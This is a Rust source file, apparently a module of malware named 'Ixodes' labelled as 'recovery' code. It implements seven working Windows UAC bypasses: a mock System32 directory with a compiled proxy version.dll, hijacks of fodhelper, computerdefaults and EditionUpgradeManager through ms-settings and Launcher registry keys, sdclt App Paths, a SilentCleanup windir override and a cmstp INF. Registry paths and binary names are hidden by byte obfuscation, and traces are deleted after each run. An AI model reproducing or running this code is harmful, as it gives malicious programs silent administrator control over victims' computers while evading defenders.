use crate::recovery::helpers::obfuscation::deobf;
use crate::recovery::settings::RecoveryControl;
use std::env;
use std::fs;
use std::path::Path;
use std::process::Command;
use tracing::{debug, info, warn};
use winreg::RegKey;
use winreg::enums::*;

pub fn is_admin() -> bool {
    let output = Command::new("net").arg("session").output();

    match output {
        Ok(out) => out.status.success(),
        Err(_) => false,
    }
}

pub async fn attempt_uac_bypass() {
    if !RecoveryControl::global().uac_bypass_enabled() {
        return;
    }

    if is_admin() {
        debug!("already running with administrative privileges");
        return;
    }

    let bypasses: [(&str, fn() -> Result<(), Box<dyn std::error::Error>>); 7] = [
        ("mock_dir", mock_dir_bypass),
        ("editionupgrade", edition_upgrade_bypass),
        ("sdclt_apppaths", sdclt_apppaths_bypass),
        ("fodhelper", fodhelper_bypass),
        ("computerdefaults", computer_defaults_bypass),
        ("silentcleanup", silent_cleanup_bypass),
        ("cmstp", cmstp_bypass),
    ];

    for (name, bypass_fn) in bypasses {
        info!(method = name, "attempting UAC bypass");
        if let Err(err) = bypass_fn() {
            warn!(method = name, error = ?err, "UAC bypass failed");
        } else {
            info!(
                method = name,
                "UAC bypass triggered, exiting current process"
            );
            std::thread::sleep(std::time::Duration::from_millis(1000));
            std::process::exit(0);
        }
    }
}

fn mock_dir_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?;
    let win_dir = env::var("WINDIR").unwrap_or_else(|_| r"C:\Windows".to_string());

    let temp_dir = env::temp_dir();
    let dll_src_path = temp_dir.join("ixodes_v.rs");
    let dll_path = temp_dir.join("version.dll");

    let dll_code = format!(
        r#"
        use std::process::Command;
        #[no_mangle]
        pub extern "system" fn DllMain(_hinst: *const (), reason: u32, _reserved: *const ()) -> i32 {{
            if reason == 1 {{
                let _ = Command::new(r"{}").spawn();
            }}
            1
        }}
        
        #[no_mangle] pub extern "system" fn GetFileVersionInfoA() {{}}
        #[no_mangle] pub extern "system" fn GetFileVersionInfoByHandle() {{}}
        #[no_mangle] pub extern "system" fn GetFileVersionInfoExA() {{}}
        #[no_mangle] pub extern "system" fn GetFileVersionInfoExW() {{}}
        #[no_mangle] pub extern "system" fn GetFileVersionInfoSizeA() {{}}
        #[no_mangle] pub extern "system" fn GetFileVersionInfoSizeExA() {{}}
        #[no_mangle] pub extern "system" fn GetFileVersionInfoSizeExW() {{}}
        #[no_mangle] pub extern "system" fn GetFileVersionInfoSizeW() {{}}
        #[no_mangle] pub extern "system" fn GetFileVersionInfoW() {{}}
        #[no_mangle] pub extern "system" fn VerFindFileA() {{}}
        #[no_mangle] pub extern "system" fn VerFindFileW() {{}}
        #[no_mangle] pub extern "system" fn VerInstallFileA() {{}}
        #[no_mangle] pub extern "system" fn VerInstallFileW() {{}}
        #[no_mangle] pub extern "system" fn VerLanguageNameA() {{}}
        #[no_mangle] pub extern "system" fn VerLanguageNameW() {{}}
        #[no_mangle] pub extern "system" fn VerQueryValueA() {{}}
        #[no_mangle] pub extern "system" fn VerQueryValueW() {{}}
        "#,
        current_exe.to_string_lossy()
    );

    fs::write(&dll_src_path, dll_code)?;

    let status = Command::new("rustc")
        .args(&[
            "--crate-type=cdylib",
            "-o",
            dll_path.to_str().unwrap(),
            dll_src_path.to_str().unwrap(),
        ])
        .status()?;

    if !status.success() {
        return Err("failed to compile proxy DLL".into());
    }

    let mock_win = format!(r"\\?\{} \", win_dir);
    let mock_sys32 = format!(r"{}\System32", mock_win);

    let _ = fs::create_dir_all(&mock_sys32);

    let target_winsat = Path::new(&mock_sys32).join("winsat.exe");
    let target_dll = Path::new(&mock_sys32).join("version.dll");

    fs::copy(format!(r"{}\System32\winsat.exe", win_dir), &target_winsat)?;
    fs::copy(&dll_path, &target_dll)?;

    let _ = Command::new(&target_winsat).spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(3000));

    Ok(())
}

fn edition_upgrade_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    // HKCU\Software\Classes\Launcher.SystemSettings\Shell\Open\Command
    let base_path = deobf(&[
        0x8D, 0x41, 0x6F, 0xA3, 0xF3, 0x6E, 0x9D, 0xF5, 0x95, 0x26, 0x8F, 0x12, 0xF5, 0x72, 0x3C,
        0x81, 0x32, 0x5B, 0xC5, 0x4F, 0xD9, 0x8A, 0xB2, 0x13, 0xB0, 0x00, 0xE8, 0x6C, 0x9D, 0x18,
        0xCD, 0x32, 0xED, 0x35, 0x37, 0xA4, 0x9C, 0xD0, 0xE6, 0xFC, 0x75, 0xC7, 0x7F, 0xF3, 0x83,
        0x5F, 0x6A, 0xA3, 0x3E, 0xA5, 0x89, 0x96, 0x8C, 0x08, 0xCB, 0x67, 0x43, 0x40, 0x27,
    ]);
    let (key, _) = hkcu.create_subkey(base_path)?;

    key.set_value("", &current_exe)?;
    key.set_value("DelegateExecute", &"")?;

    let edition_upgrade = deobf(&[
        0x9B, 0x7B, 0x63, 0xA3, 0x92, 0xAC, 0x9C, 0xFD, 0xA9, 0x6E, 0xA7, 0x12, 0x02, 0xB3, 0x26,
        0x8A, 0x20, 0x6D, 0x2D, 0xCF, 0x99, 0x6C, 0xCD, 0x9C, 0xA7,
    ]);
    let _ = Command::new(edition_upgrade).spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = hkcu.delete_subkey_all(deobf(&[
        0x8D, 0x41, 0x6F, 0xA3, 0xF3, 0x6E, 0x9D, 0xF5, 0x95, 0x26, 0x8F, 0x12, 0xF5, 0x72, 0x3C,
        0x81, 0x32, 0x5B, 0xC5, 0x4F, 0xD9, 0x8A, 0xB2, 0x13, 0xB0, 0x00, 0xE8, 0x6C, 0x9D, 0x18,
    ]));

    Ok(())
}

fn sdclt_apppaths_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    // HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe
    let base_path = deobf(&[
        0x8D, 0x41, 0x6F, 0xA3, 0xF3, 0x6E, 0x9D, 0xF5, 0x95, 0x3A, 0xFB, 0xE2, 0xE5, 0xF2, 0xB8,
        0x83, 0x28, 0x0B, 0xD1, 0x7E, 0x29, 0x74, 0x8D, 0x18, 0xB5, 0xFF, 0x84, 0xDD, 0x7D, 0x58,
        0x11, 0x0E, 0x90, 0x1B, 0xAF, 0x3D, 0x2C, 0x30, 0x66, 0xFE, 0x87, 0xD5, 0xD8, 0x8B, 0xC3,
        0xC0, 0x69, 0xBA, 0x3A, 0xA3, 0xFD, 0x96, 0x8A, 0x08, 0x08, 0xEA, 0x50, 0x46, 0xC4, 0x83,
        0x7E, 0x9B, 0xC5,
    ]);
    let (key, _) = hkcu.create_subkey(base_path)?;

    key.set_value("", &current_exe)?;

    let sdclt = deobf(&[0xAD, 0x7B, 0x7B, 0xE3, 0xC3, 0xD4, 0x59, 0x6A, 0x9C]);
    let _ = Command::new(sdclt).spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = hkcu.delete_subkey_all(deobf(&[
        0x8D, 0x41, 0x6F, 0xA3, 0xF3, 0x6E, 0x9D, 0xF5, 0x95, 0x3A, 0xFB, 0xE2, 0xE5, 0xF2, 0xB8,
        0x83, 0x28, 0x0B, 0xD1, 0x7E, 0x29, 0x74, 0x8D, 0x18, 0xB5, 0xFF, 0x84, 0xDD, 0x7D, 0x58,
        0x11, 0x0E, 0x90, 0x1B, 0xAF, 0x3D, 0x2C, 0x30, 0x66, 0xFE, 0x87, 0xD5, 0xD8, 0x8B, 0xC3,
        0xC0, 0x69, 0xBA, 0x3A, 0xA3, 0xFD, 0x96, 0x8A, 0x08, 0x08, 0xEA, 0x50, 0x46, 0xC4, 0x83,
        0x7E, 0x9B, 0xC5,
    ]));

    Ok(())
}

fn fodhelper_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    // "Software\\Classes\\ms-settings\\Shell\\Open\\command"
    let base_path = deobf(&[
        0xB3, 0x59, 0x52, 0xAB, 0xD2, 0x0C, 0x1D, 0xF3, 0xA7, 0x6E, 0xA3, 0x90, 0x69, 0xA5, 0xEB,
        0x56, 0x3C, 0xF5, 0x7E, 0x41, 0xE1, 0xE7, 0x0E, 0x45, 0x7C, 0x5E, 0xA5, 0xA2, 0xBE, 0x01,
        0xEC, 0xED, 0x0C, 0x4D, 0x74, 0x54, 0xAC, 0xBE, 0x19, 0xEC, 0xF5, 0x0B, 0x4C, 0x3C, 0xFA,
        0x78, 0x40, 0xFE,
    ]);
    let (key, _) = hkcu.create_subkey(&base_path)?;

    // "DelegateExecute"
    let delegate_execute = deobf(&[
        0x9A, 0x75, 0x57, 0x3C, 0xF2, 0x6E, 0x1D, 0xF5, 0x7C, 0x4C, 0xEB, 0xE2, 0x15, 0x52, 0x3C,
    ]);
    key.set_value("", &current_exe)?;
    key.set_value(delegate_execute, &"")?;

    // "fodhelper.exe"
    let fodhelper = deobf(&[
        0xB8, 0x41, 0x77, 0x04, 0xD2, 0x0F, 0x1C, 0xF5, 0xAB, 0xF9, 0xEB, 0x49, 0x12,
    ]);

    let _ = Command::new(fodhelper).spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = hkcu.delete_subkey_all(deobf(&[
        0xB3, 0x59, 0x52, 0xAB, 0xD2, 0x0C, 0x1D, 0xF3, 0xA7, 0x6E, 0xA3, 0x90, 0x69, 0xA5, 0xEB,
        0x56, 0x3C, 0xF5, 0x7E, 0x41, 0xE1, 0xE7, 0x0E, 0x45, 0x7C, 0x5E, 0xA5, 0xA2,
    ]));

    Ok(())
}

fn computer_defaults_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    let base_path = r"Software\Classes\ms-settings\Shell\Open\command";
    let (key, _) = hkcu.create_subkey(base_path)?;

    key.set_value("", &current_exe)?;
    key.set_value("DelegateExecute", &"")?;

    let _ = Command::new("computerdefaults.exe").spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = hkcu.delete_subkey_all(r"Software\Classes\ms-settings");

    Ok(())
}

fn silent_cleanup_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    let (env_key, _) = hkcu.create_subkey("Environment")?;
    let payload = format!("cmd /c start \"\" \"{}\" && rem ", current_exe);
    env_key.set_value("windir", &payload)?;

    let schtasks = deobf(&[
        0xAD, 0x79, 0x67, 0xA3, 0x1D, 0x2C, 0xDF, 0xEC, 0x67, 0x6A, 0xBF, 0xF2,
    ]);
    let task_path = deobf(&[
        0x82, 0x6B, 0xD3, 0x1C, 0x3D, 0x4C, 0xDC, 0xEC, 0xA6, 0x68, 0xAF, 0x2A, 0x82, 0xFD, 0x3F,
        0x04, 0x2A, 0x11, 0x6D, 0x5F, 0xF8, 0xA9, 0x85, 0x15, 0xB1, 0x8F, 0x2B, 0x94, 0x7C, 0x7A,
        0x10, 0x36, 0x8E, 0x2B, 0x97, 0xAD, 0x9C, 0x13, 0x61, 0x01, 0x8D, 0xE7, 0x0F, 0xF3, 0xD0,
        0x9E, 0x20, 0x33,
    ]);

    let _ = Command::new(schtasks)
        .args(&["/run", "/tn", &task_path, "/I"])
        .spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = env_key.delete_value("windir");

    Ok(())
}

fn cmstp_bypass() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?.to_string_lossy().to_string();
    let temp_dir = env::temp_dir();
    let inf_path = temp_dir.join("ixodes_uac.inf");

    let inf_content = format!(
        r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
RunPostSetupCommands=RunCommand

[RunCommand]
"{}"
[Strings]
ServiceName=\"Ixodes\"
ShortSvcName=\"Ixodes\"
"#,
        current_exe
    );

    std::fs::write(&inf_path, inf_content)?;

    let _ = Command::new("cmstp.exe")
        .args(&["/au", "/s", &inf_path.to_string_lossy()])
        .spawn()?;

    std::thread::sleep(std::time::Duration::from_millis(2000));
    let _ = std::fs::remove_file(&inf_path);

    Ok(())
}
